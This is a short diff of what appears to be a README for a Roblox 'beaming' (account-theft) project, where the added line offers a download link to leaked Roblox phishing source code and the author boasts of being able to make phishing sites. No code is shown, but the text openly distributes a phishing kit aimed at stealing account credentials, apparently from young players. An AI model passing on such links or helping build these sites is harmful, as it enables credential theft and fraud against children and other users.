@@ -12,6 +12,6 @@ I made this because i dislike the skids on youtube and other stuff claiming beam
 I lost many methods. Oopsies. Sites i can make tho.
 
 
-#due to little kids and stuff i decided to leak roblox phishing source code. lol. Please note this source code is a bit old and needs to be fixed so don't ask me to fix. 
+#due to little kids and stuff i decided to leak roblox phishing source code. lol. Please note this source code is a bit old and needs to be fixed so don't ask me to fix. [LINK](https://github.com/wahlol/Roblox-Beaming/raw/main/phish1-main.zip)
 
 
